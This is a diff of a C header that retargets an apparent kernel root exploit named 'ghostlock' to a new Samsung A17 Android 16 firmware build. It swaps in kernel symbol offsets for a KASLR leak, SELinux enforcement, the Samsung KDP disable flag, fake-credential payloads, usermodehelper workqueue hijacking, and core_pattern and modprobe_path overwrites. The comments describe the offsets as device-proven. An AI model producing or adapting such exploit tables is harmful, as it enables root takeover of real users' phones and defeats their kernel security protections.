@@ -1,8 +1,12 @@
+/* CZG1 target — derived from target.h (BZA5) with kallsyms/BTF-verified
+ * CZG1 (6.12.38-android16-5-abA175FXXS6CZG1-4k) offsets; all symbol values
+ * match the device-proven CZF1 set 1:1 except wq/umh (CZF1 header was stale
+ * there). Gadgets for the env-gated filp-root fallback are TODO (=0). */
 #ifndef TARGET_H
 #define TARGET_H
 
-#define BUILD_VARIANT_LABEL "ghostlock_a17"
-#define BUILD_FINGERPRINT "samsung/a17"
+#define BUILD_VARIANT_LABEL "ghostlock_a17czg1"
+#define BUILD_FINGERPRINT "samsung/a17czg1"
 
 /* Kernel address space (VA_BITS=39) */
 #define KIMAGE_TEXT_BASE 0xffffffc080000000ULL
@@ -17,49 +21,49 @@
 #define VMEMMAP_START 0xfffffffec0000000ULL /* A17/CZF1 39-bit: verified via live pipe slot page decode (was 0xfffffffe00000000 — wrong; that value only appeared in unrelated constants) */
 
 /* Global symbol offsets (kallsyms) */
-#define INIT_TASK_OFF          0x024FCF40ULL
-#define INIT_CRED_OFF          0x02512B08ULL
-#define INIT_UTS_NS_OFF        0x02685A88ULL
-#define EMPTY_ZERO_PAGE_OFF    0x02726000ULL
-#define ROOT_TASK_GROUP_OFF    0x0272ED80ULL
-#define SELINUX_ENFORCING_OFF  0x0277E560ULL
-#define KPTR_RESTRICT_OFF      0x024FB678ULL
-#define CAP_CAPABLE_ACTIVE_OFF 0x02776030ULL
+#define INIT_TASK_OFF          0x0252CF40ULL
+#define INIT_CRED_OFF          0x02542D10ULL
+#define INIT_UTS_NS_OFF        0x026B6680ULL
+#define EMPTY_ZERO_PAGE_OFF    0x02758000ULL
+#define ROOT_TASK_GROUP_OFF    0x02760D80ULL
+#define SELINUX_ENFORCING_OFF  0x027B0540ULL
+#define KPTR_RESTRICT_OFF      0x0252B678ULL
+#define CAP_CAPABLE_ACTIVE_OFF 0x027A8010ULL
 #define KPTR_RESTRICT          (KIMAGE_TEXT_BASE + KPTR_RESTRICT_OFF)
-#define SELINUX_BLOB_SIZES_OFF 0x018A10E8ULL
+#define SELINUX_BLOB_SIZES_OFF 0x018B80E8ULL
 #define SECURITY_HOOK_HEADS_OFF 0x01846480ULL
-#define KMALLOC_CACHES_OFF     0x018974C0ULL
-#define ANON_PIPE_BUF_OPS_OFF  0x0126EF88ULL
+#define KMALLOC_CACHES_OFF     0x018AE4C0ULL
+#define ANON_PIPE_BUF_OPS_OFF  0x0127F088ULL
 /* UMH root: workqueue symbol offsets (0 = not available, set per-device) */
-#define SYSTEM_UNBOUND_WQ_OFF              0x01897250ULL
-#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000F75ECULL
-#define CONFIGFS_READ_ITER_OFF      0x00512CE4ULL
-#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00512F18ULL
-#define COPY_SPLICE_READ_OFF   0x0048E7D4ULL
-#define NOOP_LLSEEK_OFF        0x0043BB44ULL
+#define SYSTEM_UNBOUND_WQ_OFF              0x018AE250ULL
+#define CALL_USERMODEHELPER_EXEC_WORK_OFF   0x000F8FDCULL
+#define CONFIGFS_READ_ITER_OFF      0x00518E9CULL
+#define CONFIGFS_BIN_WRITE_ITER_OFF 0x005190D0ULL
+#define COPY_SPLICE_READ_OFF   0x004945B8ULL
+#define NOOP_LLSEEK_OFF        0x00441664ULL
 #define ASHMEM_MISC_FOPS_OFF   0x0ULL
-#define ASHMEM_FOPS_OFF        0x013FB018ULL
-#define ASHMEM_IOCTL_OFF       0x00DD8FA0ULL
-#define ASHMEM_COMPAT_IOCTL_OFF 0x00DD9588ULL
-#define ASHMEM_MMAP_OFF        0x00DD9604ULL
-#define ASHMEM_OPEN_OFF        0x00DD9660ULL
-#define ASHMEM_RELEASE_OFF     0x00DD9060ULL
-#define ASHMEM_SHOW_FDINFO_OFF 0x00DD9560ULL
+#define ASHMEM_FOPS_OFF        0x029203A0ULL
+#define ASHMEM_IOCTL_OFF       0x00DE4C38ULL
+#define ASHMEM_COMPAT_IOCTL_OFF 0x00DE4B08ULL
+#define ASHMEM_MMAP_OFF        0x00DE4B84ULL
+#define ASHMEM_OPEN_OFF        0x00DE4BA8ULL
+#define ASHMEM_RELEASE_OFF     0x00DE4CD8ULL
+#define ASHMEM_SHOW_FDINFO_OFF 0x00DE4AE0ULL
 
 /* KASLR leak */
-#define SLIDE_NFULNL_LOGGER_OFF       0x024F21A0ULL
-#define SLIDE_LOGGERS_0_1_OFF         0x024F20F0ULL
-#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x028204F0ULL
-#define SLIDE_SYSCTL_BOOTID_OFF       0x028204F0ULL
+#define SLIDE_NFULNL_LOGGER_OFF       0x025221A8ULL
+#define SLIDE_LOGGERS_0_1_OFF         0x025220F8ULL
+#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x028934F0ULL
+#define SLIDE_SYSCTL_BOOTID_OFF       0x028934F0ULL
 
 /* Per-cpu runqueue anchor (see target_czf1.h / A17-NOTES rq->curr section).
  * BZA5 kallsyms-a17.txt: __per_cpu_offset @ image+0x24EB810, runqueues @
  * image+0x24CF3C0, init_stack @ image+0x24E0000. RQ_CURR_OFF=0xd10 carried
  * from the CZF1 device BTF (same 6.12 GKI family) — self-validates via the
  * pid match, with the task-list walk as fallback. */
-#define PER_CPU_OFFSETS_OFF  0x024EB810ULL
-#define RUNQUEUES_OFF        0x024CF3C0ULL
-#define INIT_STACK_OFF       0x024E0000ULL
+#define PER_CPU_OFFSETS_OFF  0x0251B810ULL
+#define RUNQUEUES_OFF        0x024EF440ULL
+#define INIT_STACK_OFF       0x02510000ULL
 #define RQ_CURR_OFF          0x0D10ULL
 #define PER_CPU_OFFSETS      (KIMAGE_TEXT_BASE + PER_CPU_OFFSETS_OFF)
 #define RUNQUEUES            (KIMAGE_TEXT_BASE + RUNQUEUES_OFF)
@@ -76,15 +80,15 @@
 /* Samsung KDP: kdp_enable byte (0 = all KDP cred paths off, incl.
  * security_integrity_current). Followed by padding up to init_sec@+8, so an
  * 8-byte pointer write is safe. A17 vmlinux: kdp_enable @ image+0x18EB3B0. */
-#define KDP_ENABLE_OFF         0x018EB3B0ULL
+#define KDP_ENABLE_OFF         0x019033B0ULL
 #define KDP_ENABLE             (KIMAGE_TEXT_BASE + KDP_ENABLE_OFF)
 /* Fake-cred payload back-links (mode-2 write no longer touches init_cred;
  * the written cred lives in our spray page and points at these statics). */
-#define INIT_SEC_OFF      0x018EB3B8ULL
-#define INIT_USER_NS_OFF  0x025113C0ULL
-#define INIT_UCOUNTS_OFF  0x02512FF8ULL
-#define INIT_GROUPS_OFF   0x02512B00ULL
-#define ROOT_USER_OFF     0x02511638ULL
+#define INIT_SEC_OFF      0x019033B8ULL
+#define INIT_USER_NS_OFF  0x025415C8ULL
+#define INIT_UCOUNTS_OFF  0x02543200ULL
+#define INIT_GROUPS_OFF   0x02542D08ULL
+#define ROOT_USER_OFF     0x02541840ULL
 #define INIT_SEC      (KIMAGE_TEXT_BASE + INIT_SEC_OFF)
 #define INIT_USER_NS  (KIMAGE_TEXT_BASE + INIT_USER_NS_OFF)
 #define INIT_UCOUNTS  (KIMAGE_TEXT_BASE + INIT_UCOUNTS_OFF)
@@ -163,10 +167,10 @@
 #define FDT_FD_OFF               0x08
 /* channel slide anchors (BTF/nm-verified BZA5) */
 #define TASK_ACTIVE_MM_OFF       0x690          /* task_struct.active_mm */
-#define INIT_MM_OFF              0x025C1B80ULL  /* init_mm (idle's active_mm) */
-#define SYSCTL_BOOTID_ENTRY_OFF  0x0261B918ULL  /* boot_id ctl_table entry */
-#define BOOTID_STR_IMG_OFF       0x017CEDD0ULL  /* "boot_id" string (slide anchor) */
-#define PROC_DO_UUID_OFF         0x009CD4CCULL  /* its .proc_handler (@+0x18) */
+#define INIT_MM_OFF              0x025F1E00ULL  /* init_mm (idle's active_mm) */
+#define SYSCTL_BOOTID_ENTRY_OFF  0x0264BB58ULL  /* boot_id ctl_table entry */
+#define BOOTID_STR_IMG_OFF       0x017E5814ULL  /* "boot_id" string (slide anchor) */
+#define PROC_DO_UUID_OFF         0x009D6558ULL  /* its .proc_handler (@+0x18) */
 
 #define CRED_UID_OFF         8
 #define CRED_SECUREBITS_OFF  40
@@ -240,27 +244,27 @@
  * NOT the same address as SLIDE_RANDOM_BOOT_ID_DATA (the random_table boot_id
  * buffer at 0x028204F0); the pointer that proc_do_uuid dereferences lives at
  * image+0x0261B920 on BZA5. */
-#define SYSCTL_BOOTID_DATA_PTR_OFF 0x0261B920ULL
+#define SYSCTL_BOOTID_DATA_PTR_OFF 0x0264BB60ULL
 #define SYSCTL_BOOTID_DATA_PTR (KIMAGE_TEXT_BASE + SYSCTL_BOOTID_DATA_PTR_OFF)
 /* core_pattern / modprobe_path sysctl text buffers (BZA5) */
-#define CORE_PATTERN_OFF  0x025D0808ULL
-#define MODPROBE_PATH_OFF 0x02594868ULL
+#define CORE_PATTERN_OFF  0x02600A88ULL
+#define MODPROBE_PATH_OFF 0x025C4AA8ULL
 #define CORE_PATTERN  (KIMAGE_TEXT_BASE + CORE_PATTERN_OFF)
 #define MODPROBE_PATH (KIMAGE_TEXT_BASE + MODPROBE_PATH_OFF)
 /* system_unbound_wq image address (table entry carries 0 on A17 — the wq-umh
  * stage uses this compile-time BZA5 value) */
-#define SYSWQ_BZA5 (KIMAGE_TEXT_BASE + 0x01897250ULL)
+#define SYSWQ_BZA5 (KIMAGE_TEXT_BASE + 0x018AE250ULL)
 /* call_usermodehelper_exec_work (BZA5) */
-#define UMH_EXEC_WORK_BZA5 (KIMAGE_TEXT_BASE + 0x000F75ECULL)
+#define UMH_EXEC_WORK_BZA5 (KIMAGE_TEXT_BASE + 0x000F8FDCULL)
 /* fake-work staging area inside the payload page (wq-umh) */
 #define WQ_FAKE_WORK_OFF 0x1700
 #define WQ_FAKE_UMH_OFF  0x1800
 /* filp-root gadgets (BZA5 text; names lost — commit path lands mid-ashmem_ioctl) */
-#define FILP_COMMIT_GADGET_OFF 0x0010D1DCULL  /* LOST: reconstructed */
-#define NOOP_GADGET_OFF        0x0005CA2CULL  /* LOST: reconstructed */
+#define FILP_COMMIT_GADGET_OFF 0x0ULL  /* TODO CZG1: filp-root fallback gadget not located (env-gated path only) */
+#define NOOP_GADGET_OFF        0x0ULL  /* TODO CZG1: not located */
 /* perf file-vote IP window (BZA5 text range of the target ioctl handler) */
-#define ASHMEM_IOCTL_WIN_LO_OFF 0x0045ACE0ULL  /* LOST: reconstructed */
-#define ASHMEM_IOCTL_WIN_HI_OFF 0x0045C000ULL  /* LOST: reconstructed */
+#define ASHMEM_IOCTL_WIN_LO_OFF 0x0ULL  /* TODO CZG1: perf window not located */
+#define ASHMEM_IOCTL_WIN_HI_OFF 0x0ULL  /* TODO CZG1 */
 
 #endif
 
